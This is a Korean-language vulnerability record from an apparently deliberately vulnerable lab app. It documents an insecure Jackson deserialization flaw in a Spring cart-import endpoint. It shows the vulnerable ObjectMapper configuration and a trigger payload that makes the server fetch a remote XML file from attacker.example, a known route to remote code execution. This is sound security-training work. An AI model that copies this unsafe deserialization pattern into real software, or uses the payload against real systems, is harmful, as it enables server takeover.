# VULN-012 장바구니 임포트 Jackson 역직렬화

- 대상 스택: java-spring
- 심각도: Critical
- 분류: A08:2021 Software and Data Integrity Failures (Insecure Deserialization, CWE-502)

## 위치

`apps/java-spring/src/main/java/com/vulnlab/shop/vuln/CartImportController.java`, `POST /api/cart/import` — 요청 바디 원문을 별도 `ObjectMapper`로 역직렬화하는데, `activateDefaultTyping(LaissezFaireSubTypeValidator.instance, ...)`로 Jackson의 서브타입 검증을 완전히 무력화하여 클라이언트가 JSON 내 `@class` 필드로 지정한 임의 클래스를 인스턴스화하도록 허용.

```java
ObjectMapper mapper = new ObjectMapper();
mapper.activateDefaultTyping(LaissezFaireSubTypeValidator.instance, ObjectMapper.DefaultTyping.NON_FINAL);
List<?> items = mapper.readValue(rawJson, List.class);
```

의도적으로 `pom.xml`의 전역 `jackson-databind` 버전은 낮추지 않았다 — Spring Boot 3.3 parent BOM이 `jackson-core`/`jackson-annotations`/`jackson-databind`를 함께 관리하므로 databind만 구버전(예: 2.9.8)으로 pin하면 세 아티팩트 버전이 어긋나 앱 전체의 JSON 직렬화가 깨질 위험이 크다. `LaissezFaireSubTypeValidator`를 명시적으로 사용하는 것만으로 Jackson 버전과 무관하게 동일한 CWE-502 취약점(신뢰 경계 없는 타입 결정)이 재현되므로, 이 방식으로 다른 엔드포인트에 영향을 주지 않고 격리했다.

## 트리거 방법

```
POST /api/cart/import
["org.springframework.context.support.FileSystemXmlApplicationContext", "http://attacker.example/spel.xml"]
```

classpath에 존재하는 임의 클래스를 `@class`(배열 폼)로 지정해 인스턴스화 가능 — gadget 체인이 classpath에 존재하면 RCE로 이어짐. 현재 프로젝트엔 별도 gadget 라이브러리를 추가하지 않았으므로 실제 트리거는 인스턴스화 가능한 클래스 탐색이 필요.

## 영향

- 신뢰 경계 없는 타입 결정(CWE-502)으로 임의 클래스 인스턴스화 — 적절한 gadget 체인과 결합 시 RCE.

## 증거 (재현 확인)

(진단 단계에서 채움) — Phase 2(Burp 진단)에서 재현 예정.

## 조치 상태: 미조치 (의도된 취약점)
